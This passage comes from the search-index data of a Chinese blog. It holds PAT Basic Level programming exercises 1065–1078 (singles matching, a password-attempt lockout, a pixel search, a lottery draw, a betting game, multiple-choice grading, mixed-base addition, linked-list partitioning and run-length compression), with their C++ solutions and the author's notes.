&lt;algorithm&gt;#include &lt;iomanip&gt;using namespace std;struct people { int id; bool pair;} c[10100];bool cmp (people&amp;a, people&amp; b) { return a.id &lt; b.id;}int p[100100], x, y, n, num;int main() { cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; x &gt;&gt; y; p[x] = y; p[y] = x; } cin &gt;&gt; num; for (int i = 0; i &lt; num; i++) { cin &gt;&gt; c[i].id; c[i].pair = false; } int count = 0; for (int i = 0; i &lt; num; i++) { for (int j = 0; j &lt; num; j++) { if (p[c[i].id] == c[j].id) { c[i].pair = true; count++; } } } cout &lt;&lt; num - count &lt;&lt; endl; sort(c, c + num, cmp); int i = 0; while (c[i++].pair &amp;&amp; i &lt;= num); if (i &lt;= num)//这里是i&lt;=num cout &lt;&lt; setw(5) &lt;&lt; setfill('0') &lt;&lt; c[i - 1].id; //注意这里是i-1 for (; i &lt; num; i++) { if (!c[i].pair) { cout &lt;&lt; &quot; &quot; &lt;&lt; setw(5) &lt;&lt; setfill('0') &lt;&lt; c[i].id; } }} 思路与注意 因为给的数很小，所以可以列一个表格，把两个id一个作为值，一个作为引索 两层for循环，第一层固定要判断的对象，第二次逐个遍历其他人，比较id 输出，注意要五位数输出，不足前面补0 反思与评价 最后输出的条件是i&lt;=num 不是 i&lt;num, 因为我把i++写在了while的括号里面 输出第一个的时候下标要i-1,因为我把i++写在了while的括号里面","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1065-%E5%8D%95%E8%BA%AB%E7%8B%97(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1067","text":"题目 当你试图登录某个系统却忘了密码时，系统一般只会允许你尝试有限多次，当超出允许次数时，账号就会被锁死。本题就请你实现这个小功能。 输入格式： 输入在第一行给出一个密码（长度不超过 20 的、不包含空格、Tab、回车的非空字符串）和一个正整数 N（≤ 10），分别是正确的密码和系统允许尝试的次数。随后每行给出一个以回车结束的非空字符串，是用户尝试输入的密码。输入保证至少有一次尝试。当读到一行只有单个 # 字符时，输入结束，并且这一行不是用户的输入。 输出格式： 对用户的每个输入，如果是正确的密码且尝试次数不超过 N，则在一行中输出 Welcome in，并结束程序；如果是错误的，则在一行中按格式输出 Wrong password: 用户输入的错误密码；当错误尝试达到 N 次时，再输出一行 Account locked，并结束程序。 输入样例 1：123456Correct%pw 3correct%pwCorrect@PWwhatisthepassword!Correct%pw# 输出样例 1：1234Wrong password: correct%pwWrong password: Correct@PWWrong password: whatisthepassword!Account locked 输入样例 2：123456cool@gplt 3coolman@gpltcoollady@gpltcool@gplttry again# 输出样例 2：123Wrong password: coolman@gpltWrong password: coollady@gpltWelcome in 通过代码123456789101112131415161718#include&lt;iostream&gt;using namespace std;int main () { string corPwd; string pwd; int time; cin &gt;&gt; corPwd &gt;&gt; time; int i; getline(cin, pwd); for (i = 0; i &lt; time; i++) { getline(cin, pwd); if (pwd == corPwd) {cout &lt;&lt; &quot;Welcome in&quot; &lt;&lt; endl; break;} else if (pwd == &quot;#&quot;) {break;} else {cout &lt;&lt; &quot;Wrong password: &quot; &lt;&lt; pwd &lt;&lt; endl;} } if (i == time) cout &lt;&lt; &quot;Account locked&quot; &lt;&lt; endl; return 0;} 思路与注意 按照要求，输入，判断，输出结果 注意第一次输入用了cin的提取运算符&gt;&gt;，后面用了getline()函数，注意吃掉第一行输入剩下的换行符。 反思与评价 简单","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1067-%E8%AF%95%E5%AF%86%E7%A0%81(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1068","text":"题目 对于计算机而言，颜色不过是像素点对应的一个 24 位的数值。现给定一幅分辨率为 M×N 的画，要求你找出万绿丛中的一点红，即有独一无二颜色的那个像素点，并且该点的颜色与其周围 8 个相邻像素的颜色差充分大。 输入格式： 输入第一行给出三个正整数，分别是 M 和 N（≤ 1000），即图像的分辨率；以及 TOL，是所求像素点与相邻点的颜色差阈值，色差超过 TOL 的点才被考虑。随后 N 行，每行给出 M 个像素的颜色值，范围在 [0,224) 内。所有同行数字间用空格或 TAB 分开。 输出格式： 在一行中按照 (x, y): color 的格式输出所求像素点的位置以及颜色值，其中位置 x 和 y 分别是该像素在图像矩阵中的列、行编号（从 1 开始编号）。如果这样的点不唯一，则输出 Not Unique；如果这样的点不存在，则输出 Not Exist。 输入样例 1：12345678 6 2000 0 0 0 0 0 0 065280 65280 65280 16711479 65280 65280 65280 6528016711479 65280 65280 65280 16711680 65280 65280 6528065280 65280 65280 65280 65280 65280 165280 16528065280 65280 16777015 65280 65280 165280 65480 16528016777215 16777215 16777215 16777215 16777215 16777215 16777215 16777215 输出样例 1：1(5, 3): 16711680 输入样例 2：1234564 5 20 0 0 00 0 3 00 0 0 00 5 0 00 0 0 0 输出样例 2：1Not Unique 输入样例 3：12343 3 51 2 33 4 55 6 7 输出样例 3：1Not Exist 通过代码1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;map&gt;using namespace std;int main () { int m, n, t; cin &gt;&gt; n &gt;&gt; m &gt;&gt; t; int dot[1005][1005] = {0}; map&lt;int, int&gt; check; for (int i = 0; i &lt; m; i++) { for (int j = 0; j &lt; n; j++) { cin &gt;&gt; dot[i][j]; check[dot[i][j]]++; } } int count = 0, x, y; for (int i = 0; i &lt; m &amp;&amp; count &lt;= 1; i++) for (int j = 0; j &lt; n &amp;&amp; count &lt;= 1; j++) if (abs(dot[i][j] - dot[i + 1][j]) &gt; t &amp;&amp; abs(dot[i][j] - dot[i][j + 1]) &gt; t &amp;&amp; abs(dot[i][j] - dot[i - 1][j]) &gt; t &amp;&amp; abs(dot[i][j] - dot[i][j - 1]) &gt; t) if (abs(dot[i][j] - dot[i + 1][j + 1]) &gt; t &amp;&amp; abs(dot[i][j] - dot[i + 1][j - 1]) &gt; t &amp;&amp; abs(dot[i][j] - dot[i - 1][j + 1]) &gt; t &amp;&amp; abs(dot[i][j] - dot[i - 1][j - 1]) &gt; t) if (check[dot[i][j]] == 1) { count++; x = i; y = j; } if (count &gt; 1) cout &lt;&lt; &quot;Not Unique&quot; &lt;&lt; endl; else if (count == 1) cout &lt;&lt; &quot;(&quot; &lt;&lt; y + 1 &lt;&lt; &quot;, &quot; &lt;&lt; x + 1 &lt;&lt; &quot;): &quot; &lt;&lt; dot[x][y] &lt;&lt; endl; else cout &lt;&lt; &quot;Not Exist&quot; &lt;&lt; endl; return 0;} 注意 注意，满足题目条件的点出来要和周围8个差距大于tol以外，这个点的数值只能出现一次 由于数字最大2^24，int足够 数组要大于输入的m，n，最后一个测试点和倒数第二个测试点容易挂","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1068-%E4%B8%87%E7%BB%BF%E4%B8%9B%E4%B8%AD%E4%B8%80%E7%82%B9%E7%BA%A2(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1069","text":"题目 小明 PAT 考了满分，高兴之余决定发起微博转发抽奖活动，从转发的网友中按顺序每隔 N 个人就发出一个红包。请你编写程序帮助他确定中奖名单。 输入格式： 输入第一行给出三个正整数 M（≤ 1000）、N 和 S，分别是转发的总量、小明决定的中奖间隔、以及第一位中奖者的序号（编号从 1 开始）。随后 M 行，顺序给出转发微博的网友的昵称（不超过 20 个字符、不包含空格回车的非空字符串）。 注意：可能有人转发多次，但不能中奖多次。所以如果处于当前中奖位置的网友已经中过奖，则跳过他顺次取下一位。 输出格式： 按照输入的顺序输出中奖名单，每个昵称占一行。如果没有人中奖，则输出 Keep going...。 输入样例 1：123456789109 3 2Imgonnawin!PickMePickMeMeMeeeLookHereImgonnawin!TryAgainAgainTryAgainAgainImgonnawin!TryAgainAgain 输出样例 1：123PickMeImgonnawin!TryAgainAgain 输入样例 2：1232 3 5Imgonnawin!PickMe 输出样例 2：1Keep going... 通过代码12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;vector&gt;using namespace std;int main () { map&lt;string, int&gt; check; vector&lt;string&gt; v; bool out = false; int m, n, s; cin &gt;&gt; m &gt;&gt; n &gt;&gt; s; for (int i = 0; i &lt; m; i++) { string name; cin &gt;&gt; name; check[name] = 1; v.push_back(name); } for (int i = s - 1; i &lt; v.size(); i += n) { while (!check[v[i]]) i++; cout &lt;&lt; v[i] &lt;&lt; endl; out = true; check[v[i]] = 0; } if (!out) cout &lt;&lt; &quot;Keep going...&quot; &lt;&lt; endl; return 0;} 反思与评价 stl牛逼","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1069-%E5%BE%AE%E5%8D%9A%E8%BD%AC%E5%8F%91%E6%8A%BD%E5%A5%96(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1071","text":"题目 常言道“小赌怡情”。这是一个很简单的小游戏：首先由计算机给出第一个整数；然后玩家下注赌第二个整数将会比第一个数大还是小；玩家下注 t 个筹码后，计算机给出第二个数。若玩家猜对了，则系统奖励玩家 t 个筹码；否则扣除玩家 t 个筹码。 注意：玩家下注的筹码数不能超过自己帐户上拥有的筹码数。当玩家输光了全部筹码后，游戏就结束。 输入格式： 输入在第一行给出 2 个正整数 T 和 K（≤ 100），分别是系统在初始状态下赠送给玩家的筹码数、以及需要处理的游戏次数。随后 K 行，每行对应一次游戏，顺序给出 4 个数字： 1n1 b t n2 其中 n1 和 n2 是计算机先后给出的两个[0, 9]内的整数，保证两个数字不相等。b 为 0 表示玩家赌小，为 1 表示玩家赌大。t 表示玩家下注的筹码数，保证在整型范围内。 输出格式： 对每一次游戏，根据下列情况对应输出（其中 t 是玩家下注量，x 是玩家当前持有的筹码量）： 玩家赢，输出 Win t! Total = x.； 玩家输，输出 Lose t. Total = x.； 玩家下注超过持有的筹码量，输出 Not enough tokens. Total = x.； 玩家输光后，输出 Game Over. 并结束程序。 输入样例 1：12345100 48 0 100 23 1 50 15 1 200 67 0 200 8 输出样例 1：1234Win 100! Total = 200.Lose 50. Total = 150.Not enough tokens. Total = 150.Not enough tokens. Total = 150. 输入样例 2：12345100 48 0 100 23 1 200 15 1 200 67 0 200 8 输出样例 2：123Win 100! Total = 200.Lose 200. Total = 0.Game Over. 通过代码12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;int main () { int T, K; cin &gt;&gt; T &gt;&gt; K; for (int i = 0; i &lt; K; i++) { int n1, b, t, n2; cin &gt;&gt; n1 &gt;&gt; b &gt;&gt; t &gt;&gt; n2; if (T &amp;&amp; t &lt;= T) { if ((n2 &gt; n1) == b) { T += t; cout &lt;&lt; &quot;Win &quot; &lt;&lt; t &lt;&lt; &quot;! Total = &quot; &lt;&lt; T &lt;&lt; &quot;.&quot; &lt;&lt; endl; } else { T -= t; cout &lt;&lt; &quot;Lose &quot; &lt;&lt; t &lt;&lt; &quot;. Total = &quot; &lt;&lt; T &lt;&lt; &quot;.&quot; &lt;&lt; endl; } } else if (T &amp;&amp; t &gt; T) { cout &lt;&lt; &quot;Not enough tokens. Total = &quot; &lt;&lt; T &lt;&lt; &quot;.&quot; &lt;&lt; endl; } else { cout &lt;&lt; &quot;Game Over.&quot; &lt;&lt; endl; break; } } return 0;} 思路与注意 这道题又坑人了，输出的时候要以输出样例为准，Total与前面的 ! 或 . 直接有两个空格，题干上只有一个。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1071-%E5%B0%8F%E8%B5%8C%E6%80%A1%E6%83%85(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1072","text":"题目 下图是上海某校的新学期开学寄语：天将降大任于斯人也，必先删其微博，卸其 QQ，封其电脑，夺其手机，收其 ipad，断其 wifi，使其百无聊赖，然后，净面、理发、整衣，然后思过、读书、锻炼、明智、开悟、精进。而后必成大器也！本题要求你写个程序帮助这所学校的老师检查所有学生的物品，以助其成大器。 输入格式： 输入第一行给出两个正整数 N（≤ 1000）和 M（≤ 6），分别是学生人数和需要被查缴的物品种类数。第二行给出 M 个需要被查缴的物品编号，其中编号为 4 位数字。随后 N 行，每行给出一位学生的姓名缩写（由 1-4 个大写英文字母组成）、个人物品数量 K（0 ≤ K ≤ 10）、以及 K 个物品的编号。 输出格式： 顺次检查每个学生携带的物品，如果有需要被查缴的物品存在，则按以下格式输出该生的信息和其需要被查缴的物品的信息（注意行末不得有多余空格）： 1姓名缩写: 物品编号1 物品编号2 …… 最后一行输出存在问题的学生的总人数和被查缴物品的总数。 输入样例：1234564 22333 6666CYLL 3 1234 2345 3456U 4 9966 6666 8888 6666GG 2 2333 7777JJ 3 0012 6666 2333 输出样例：1234U: 6666 6666GG: 2333JJ: 6666 23333 5 通过代码12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;int main () { int n, m, stu = 0, item = 0; cin &gt;&gt; n &gt;&gt; m; string ob[n]; for (int i = 0; i &lt; m; i++) cin &gt;&gt; ob[i]; for (int i = 0; i &lt; n; i++) { string name, object; int num, count = 0; cin &gt;&gt; name &gt;&gt; num; for (int j = 0; j &lt; num; j++) { cin &gt;&gt; object; for (int k = 0; k &lt; m; k++) { if (object == ob[k]) { if (count++ == 0) cout &lt;&lt; name &lt;&lt; &quot;:&quot;; cout &lt;&lt; &quot; &quot; &lt;&lt; object; break; } } } item += count; stu += count &gt; 0 ? 1 : 0; if (count) cout &lt;&lt; endl; } cout &lt;&lt; stu &lt;&lt; &quot; &quot; &lt;&lt; item &lt;&lt; endl; return 0;}","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1072-%E5%BC%80%E5%AD%A6%E5%AF%84%E8%AF%AD(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1073","text":"题目 批改多选题是比较麻烦的事情，有很多不同的计分方法。有一种最常见的计分方法是：如果考生选择了部分正确选项，并且没有选择任何错误选项，则得到 50% 分数；如果考生选择了任何一个错误的选项，则不能得分。本题就请你写个程序帮助老师批改多选题，并且指出哪道题的哪个选项错的人最多。 输入格式： 输入在第一行给出两个正整数 N（≤1000）和 M（≤100），分别是学生人数和多选题的个数。随后 M 行，每行顺次给出一道题的满分值（不超过 5 的正整数）、选项个数（不少于 2 且不超过 5 的正整数）、正确选项个数（不超过选项个数的正整数）、所有正确选项。注意每题的选项从小写英文字母 a 开始顺次排列。各项间以 1 个空格分隔。最后 N 行，每行给出一个学生的答题情况，其每题答案格式为 (选中的选项个数 选项1 ……)，按题目顺序给出。注意：题目保证学生的答题情况是合法的，即不存在选中的选项数超过实际选项数的情况。 输出格式： 按照输入的顺序给出每个学生的得分，每个分数占一行，输出小数点后 1 位。最后输出错得最多的题目选项的信息，格式为：错误次数 题目编号（题目按照输入的顺序从1开始编号）-选项号。如果有并列，则每行一个选项，按题目编号递增顺序输出；再并列则按选项号递增顺序输出。行首尾不得有多余空格。如果所有题目都没有人错，则在最后一行输出 Too simple。 输入样例 1：123456783 4 3 4 2 a c2 5 1 b5 3 2 b c1 5 4 a b d e(2 a c) (3 b d e) (2 a c) (3 a b e)(2 a c) (1 b) (2 a b) (4 a b d e)(2 b d) (1 e) (1 c) (4 a b c d) 输出样例 1：1234563.56.02.52 2-e2 3-a2 3-b 输入样例 2：123452 2 3 4 2 a c2 5 1 b(2 a c) (1 b)(2 a c) (1 b) 输出样例 2：1235.05.0Too simple 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iomanip&gt;using namespace std;class Option {//用于统计正确选项的信息public: double score = 0;int optionNum = 0, corOptionNum = 0, num = 0, maxFalseNum = -1, FalseNum[6] = {0}; //正确选项的分数,选项个数,正确选项的个数,题目的编号，从1开始,错误次数的最大值,每一个选项的错误次数 vector&lt;char&gt; correctOption, FalseMostOp;//记录正确选项,记录错误次数最多的选项 int check(vector&lt;char&gt; select) { //0错，1对，2半对 bool want1 = false, want2 = false; for (int i = 0; i &lt; select.size(); i++) {//第一次查找，有没有多选的 bool found = false; for (int j = 0; j &lt; correctOption.size(); j++) { if (correctOption[j] == select[i]) { found = true; break; } } if (!found) { //学生选了，不是正确选项 want1 = true; FalseNum[select[i]-'a']++; } } for (int i = 0; i &lt; correctOption.size(); i++) {//第二次查找，有没有漏选的 bool found = false; for (int j = 0; j &lt; select.size(); j++) { if (correctOption[i] == select[j]) { found = true; break; } } if (!found) { //本身是正确选项，学生没选 want2 = true; FalseNum[correctOption[i]-'a']++; } } if (want1) return 0;//学生的选择有正确选择中没有的，错！ //学生的选择是正确选项的子集 if (want2) return 2;//学生的选择正确选项都有，但是正确选项中有学生没选的，半对！ //正确选项是学生选择的子集 return 1;//两个互为子集，则选择相同，对！ } friend istream &amp;operator&gt;&gt;(istream &amp;file, Option &amp;object); void caculate () {//计算错误次数的最大值，并记录错的多的选项 maxFalseNum = FalseNum[0]; for (int i = 0; i &lt; optionNum; i++) if (FalseNum[i] &gt; maxFalseNum) maxFalseNum = FalseNum[i]; for (int i = 0; i &lt; optionNum; i++) if (FalseNum[i] == maxFalseNum) FalseMostOp.push_back(i + 'a'); } int getAllFalseNum() { return maxFalseNum; }};istream &amp;operator&gt;&gt;(istream &amp;file, Option &amp;object) {//正确选项信息 file &gt;&gt; object.score &gt;&gt; object.optionNum &gt;&gt; object.corOptionNum; for (int i = 0; i &lt; object.corOptionNum; i++) { file.ignore(); char temp; file &gt;&gt; temp; object.correctOption.push_back(temp); } return file;}class choose {//记录某个题学生的选择信息public: int num = 0; vector&lt;char&gt; option; friend istream &amp;operator&gt;&gt;(istream &amp;file, choose &amp;object); void clear() { option.clear(); num = 0; }};istream &amp;operator&gt;&gt;(istream &amp;file, choose &amp;object) {//输入学生的选择 char x; cin &gt;&gt; x; file &gt;&gt; object.num; for (int i = 0; i &lt; object.num; i++) { file.ignore(); char temp; file &gt;&gt; temp; object.option.push_back(temp); } file.ignore(); return file;}struct Stu { vector&lt;choose&gt; cho; double score = 0; };//记录学生选择和得分int main() { int n, m; cin &gt;&gt; n &gt;&gt; m; Stu student[n]; Option op[m]; choose choTemp;//用于暂时储存输入，由于用了vector，每次要clear() for (int i = 0; i &lt; m; i++) { cin &gt;&gt; op[i]; op[i].num = i + 1; } for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; m; j++) { choTemp.clear(); cin &gt;&gt; choTemp; cin.ignore(); student[i].cho.push_back(choTemp); }//一个学生的选择输入完成 for (int j = 0; j &lt; m; j++) {//对刚刚输入的这个学生进行判分 int n = op[j].check(student[i].cho[j].option); if (n == 1) student[i].score += op[j].score; else if (n == 2) student[i].score += op[j].score*0.5; } } for (int i = 0; i &lt; n; i++)//输出分数 cout &lt;&lt; fixed &lt;&lt; setprecision(1) &lt;&lt; student[i].score &lt;&lt; endl; for (int i = 0; i &lt; m; i++)//计算错的最多的选项 op[i].caculate(); int max = 0; for (int i = 0; i &lt; m; i++)//查找最大值 if (max &lt; op[i].getAllFalseNum()) max = op[i].getAllFalseNum(); if (max &gt; 0) {//输出 for (int i = 0; i &lt; m; i++) if (op[i].getAllFalseNum() == max) for (int j = 0; j &lt; op[i].FalseMostOp.size(); j++) cout &lt;&lt; max &lt;&lt; ' ' &lt;&lt; op[i].num &lt;&lt; '-' &lt;&lt; op[i].FalseMostOp[j] &lt;&lt; endl; } else { cout &lt;&lt; &quot;Too simple&quot; &lt;&lt; endl; } return 0;} 思路与注意 这道题是题目：PAT乙级题–1058 选择题，的升级版，其中输入一样，只是给分方式变成了：全对给全分，部分对给一半分，有错不得分 判分方式 判分思想：a是b的子集，且b是a的子集，那么a，b两个集合相等 定义一个判分函数，属于Option类，全对返回1，有错返回0，半对返回2。 两次遍历查找，第一遍查找学生的选择中有没有不是正确选项的，如果有，记录这个选项错了一次。第二次查找正确选项中是否存在学生没有选的，如果有记录这个选项错了一次 第一次查找就有错，返回0。（如果没错，说明：学生的选择是正确选项的子集） 如果第二次查找有错而第一次没有，说明学生没选全，返回2。（如果没错，说明：正确选项是学生的子集） 如果两次遍历都没错，说明学生选择就是正确答案，返回1。（说明：两个集合互为子集，两个集合相等） 统计错误选项 定义了一个calculate()函数，用于统计那个题错的最多，最多的选项有哪些 在所有学生的题判完以后，所有选项的错误次数也就统计完整了，这时调用计算一下 注意 不能一边找最大值一边计算，我也不知道为啥，一定要先计算一边错误最多的选项，再找最大值。 反思与评价 这道题其实不用写这么多类，运算符重载，构造函数什么的，代码可以更加精简。但是这样写的好处有： 数据处理方便，不会导致main函数里面定义过多变量导致代码可读性变差。 main函数更加简洁，可以把思路放在逻辑算法上而不是数据的处理上，就像我们使用vector，set，map等模板时，并不需要知道其内部如何实现，使得编码效率提高。 这道题很努力的在压行，如果用Astyle风格format一下的话能有200行","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1073-%E5%A4%9A%E9%80%89%E9%A2%98%E5%B8%B8%E8%A7%81%E8%AE%A1%E5%88%86%E6%B3%95(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1074","text":"题目 地球人习惯使用十进制数，并且默认一个数字的每一位都是十进制的。而在 PAT 星人开挂的世界里，每个数字的每一位都是不同进制的，这种神奇的数字称为“PAT数”。每个 PAT 星人都必须熟记各位数字的进制表，例如“……0527”就表示最低位是 7 进制数、第 2 位是 2 进制数、第 3 位是 5 进制数、第 4 位是 10 进制数，等等。每一位的进制 d 或者是 0（表示十进制）、或者是 [2，9] 区间内的整数。理论上这个进制表应该包含无穷多位数字，但从实际应用出发，PAT 星人通常只需要记住前 20 位就够用了，以后各位默认为 10 进制。 在这样的数字系统中，即使是简单的加法运算也变得不简单。例如对应进制表“0527”，该如何计算“6203 + 415”呢？我们得首先计算最低位：3 + 5 = 8；因为最低位是 7 进制的，所以我们得到 1 和 1 个进位。第 2 位是：0 + 1 + 1（进位）= 2；因为此位是 2 进制的，所以我们得到 0 和 1 个进位。第 3 位是：2 + 4 + 1（进位）= 7；因为此位是 5 进制的，所以我们得到 2 和 1 个进位。第 4 位是：6 + 1（进位）= 7；因为此位是 10 进制的，所以我们就得到 7。最后我们得到：6203 + 415 = 7201。 输入格式： 输入首先在第一行给出一个 N 位的进制表（0 &lt; N ≤ 20），以回车结束。 随后两行，每行给出一个不超过 N 位的非负的 PAT 数。 输出格式： 在一行中输出两个 PAT 数之和。 输入样例：1233052706203415 输出样例：17201 通过代码1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main () { string a, b, n, ans; getline(cin, n); getline(cin, a); getline(cin, b); int len = a.length() &gt; b.length() ? a.length() : b.length(); len = len &gt; n.length() ? len : n.length(); a.insert(0, (len - a.length() &gt; 0 ? len - a.length() : 0), '0'); b.insert(0, (len - b.length() &gt; 0 ? len - b.length() : 0), '0'); n.insert(0, (len - n.length() &gt; 0 ? len - n.length() : 0), '0'); int carry = 0; for (int i = len - 1, count = 0; i &gt;= 0; i--, count++) { int c = (a[i] + b[i] - '0' * 2) + carry; carry = c / ((n[i] - '0') == 0 ? 10 : (n[i] - '0')); c %= ((n[i] - '0') == 0 ? 10 : (n[i] - '0')); ans.insert(0, 1, c + '0'); } ans.insert(0, 1, carry + '0'); int i = 0; bool zero = true; while (ans[i] == '0' || ans[i] == 0)i++; for (; i &lt; ans.length(); i++) { cout &lt;&lt; ans[i]; zero = false; } if (zero) cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return 0;} 注意 注意计算结果为0 注意计算结果可能大于输入的最大长度","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1074-%E5%AE%87%E5%AE%99%E6%97%A0%E6%95%8C%E5%8A%A0%E6%B3%95%E5%99%A8(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1075","text":"题目 给定一个单链表，请编写程序将链表元素进行分类排列，使得所有负值元素都排在非负值元素的前面，而 [0, K] 区间内的元素都排在大于 K 的元素前面。但每一类内部元素的顺序是不能改变的。例如：给定链表为 18→7→-4→0→5→-6→10→11→-2，K 为 10，则输出应该为 -4→-6→-2→7→0→5→10→18→11。 输入格式： 每个输入包含一个测试用例。每个测试用例第 1 行给出：第 1 个结点的地址；结点总个数，即正整数N (≤105)；以及正整数K (≤103)。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。 接下来有 N 行，每行格式为： 1Address Data Next 其中 Address 是结点地址；Data 是该结点保存的数据，为 [−105,105] 区间内的整数；Next 是下一结点的地址。题目保证给出的链表不为空。 输出格式： 对每个测试用例，按链表从头到尾的顺序输出重排后的结果链表，其上每个结点占一行，格式与输入相同。 输入样例：1234567891000100 9 1023333 10 2777700000 0 9999900100 18 1230968237 -6 2333333218 -4 0000048652 -2 -199999 5 6823727777 11 4865212309 7 33218 输出样例：12345678933218 -4 6823768237 -6 4865248652 -2 1230912309 7 0000000000 0 9999999999 5 2333323333 10 0010000100 18 2777727777 11 -1 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;struct node { int add; int next; int data;};int first, num, k;node v[100005];node x[100005];node a[100005], b[100005], c[100005];void print(node* m, int size) { for (int i = 0; i &lt; size - 1; i++) printf (&quot;%05d %d %05d\\n&quot;, m[i].add, m[i].data, m[i + 1].add); printf (&quot;%05d %d -1\\n&quot;, m[size - 1].add, m[size - 1].data);}int get() { scanf (&quot;%d%d%d&quot;, &amp;first, &amp;num, &amp;k); node temp; for (int i = 0; i &lt; num; i++) { scanf (&quot;%d%d%d&quot;, &amp;temp.add, &amp;temp.data, &amp;temp.next); v[temp.add] = temp; } int find = first; int c = 0; while (find != -1) { x[c++] = (v[find]); find = v[find].next; } return c;}int main () { int real = get(); int an = 0, bn = 0, cn = 0; for (int i = 0; i &lt; real; i++) { if (x[i].data &lt; 0) a[an++] = (x[i]); else if (x[i].data &gt; k) c[cn++] = (x[i]); else b[bn++] = (x[i]); } int count = 0; for (int i = 0; i &lt; an; i++) x[count++] = a[i]; for (int i = 0; i &lt; bn; i++) x[count++] = b[i]; for (int i = 0; i &lt; cn; i++) x[count++] = c[i]; print(x, real); return 0;} 思路与注意 输入数据（由于后面要还原链表，为了降低复杂度，把addr当做引索） 把链表先还原，同时返回还原后的节点个数（因为有可能某些节点不在链表上） 分类统计，最后再重新排回去 输出（输出的时候最好把它变成一个整体，不要分块输出（可能存在某一部分空的情况）） 反思与评价 这道题就是改了改反转链表 思想实际上是德才论和反转链表的综合，简单题 反转链表用vector可以过，但是这个题用vector就会段错误，所以用普通数组","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1075-%E9%93%BE%E8%A1%A8%E5%85%83%E7%B4%A0%E5%88%86%E7%B1%BB(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1078","text":"题目 文本压缩有很多种方法，这里我们只考虑最简单的一种：把由相同字符组成的一个连续的片段用这个字符和片段中含有这个字符的个数来表示。例如 ccccc 就用 5c 来表示。如果字符没有重复，就原样输出。例如 aba 压缩后仍然是 aba。 解压方法就是反过来，把形如 5c 这样的表示恢复为 ccccc。 本题需要你根据压缩或解压的要求，对给定字符串进行处理。这里我们简单地假设原始字符串是完全由英文字母和空格组成的非空字符串。 输入格式： 输入第一行给出一个字符，如果是 C 就表示下面的字符串需要被压缩；如果是 D 就表示下面的字符串需要被解压。第二行给出需要被压缩或解压的不超过 1000 个字符的字符串，以回车结尾。题目保证字符重复个数在整型范围内，且输出文件不超过 1MB。 输出格式： 根据要求压缩或解压字符串，并在一行中输出结果。 输入样例 1：12CTTTTThhiiiis isssss a tesssst CAaaa as 输出样例 1：15T2h4is i5s a3 te4st CA3a as 输入样例 2：12D5T2h4is i5s a3 te4st CA3a as10Z 输出样例 2：1TTTTThhiiiis isssss a tesssst CAaaa asZZZZZZZZZZ 通过代码（极致压行版）12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;ctype.h&gt;using namespace std;void Cprint(int&amp; count, char a) {//注意count是引用变量 if (count != 1) cout &lt;&lt; count; cout &lt;&lt; a; count = 0;}int main () { string str, c; int i = 0, count = 1;//i是解码的循环变量，控制下标。count是压缩过程中记录重复字符出现次数的 getline(cin, c); getline(cin, str);//输入 if (c == &quot;C&quot;) { for (int j = 1; j &lt; str.length(); j++, count++)//每次循环count++ if (str[j - 1] != str[j]) Cprint(count, str[j - 1]);//如果遇到一个字符和前一个不一样，输出，让count归零 Cprint(count, str[str.length() - 1]);//输出最末尾的一个或一串 } else if (c == &quot;D&quot;) { if (!isdigit(str[i])) cout &lt;&lt; str[i++];//第一个不是数字，直接输出，i++访问下一个字符 for (int n = 0; i &lt; str.length(); n = 0, i++) {//n为每个字符前的数字 for (; i &lt; str.length() &amp;&amp; isdigit(str[i]); n *= 10, n += (str[i++] - '0'));//如果是数字，就把数字字符转换成数，这里不是双层for循环嵌套，这个for循环后有一个分号 for (int j = 0; j &lt; (n == 0 ? 1 : n); j++) cout &lt;&lt; str[i];//循环输出字符，如果没有遇到数字，n为0，就输出一次 } } return 0;} 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;ctype.h&gt;using namespace std;struct out { char c; int n; };void C () { string str; getline(cin, str); int n = str.length(); out data[n] = {0}; char last = -1; int count = -1; for (int i = 0; i &lt; n; i++) { if (str[i] != last) data[++count].c = str[i]; data[count].n++; last = str[i]; } for (int i = 0; i &lt; count + 1; i++) { if (data[i].n != 1) cout &lt;&lt; data[i].n; cout &lt;&lt; data[i].c; }}void D () { string str; getline(cin, str); int i = 0; if (!isdigit(str[i])) cout &lt;&lt; str[i++]; while (i &lt; str.length()) { int n = 0; while (i &lt; str.length() &amp;&amp; isdigit(str[i])) { n *= 10; n += str[i++] - '0'; } for (int j = 0; j &lt; n; j++) cout &lt;&lt; str[i]; i++; while ( i &lt; str.length() 